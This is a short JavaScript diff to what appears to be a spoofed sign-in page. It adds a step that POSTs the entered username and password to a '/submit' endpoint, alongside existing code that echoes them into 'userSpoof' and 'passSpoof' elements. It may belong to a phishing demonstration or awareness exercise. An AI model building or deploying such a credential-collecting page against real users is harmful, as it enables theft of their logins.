@@ -57,10 +57,24 @@
     const error = document.querySelector('#error');
     const back = document.querySelector('#back');
 
-    signIn.addEventListener('submit', event => {
+    signIn.addEventListener('submit', async event => {
       event.preventDefault();
       document.getElementById("userSpoof").innerHTML = username.value;
       document.getElementById("passSpoof").innerHTML = password.value;
+      try {
+          const response = await fetch('/submit', {
+            method: 'POST',
+            body: new URLSearchParams({
+              username: username.value,
+              password: password.value
+            })
+          });
+
+          if (!response.ok) throw new Error("POST failed");
+        } catch (err) {
+          console.error(err);
+          return;
+        }
       signIn.reset();
       error.hidden = true;
       login.hidden = true;
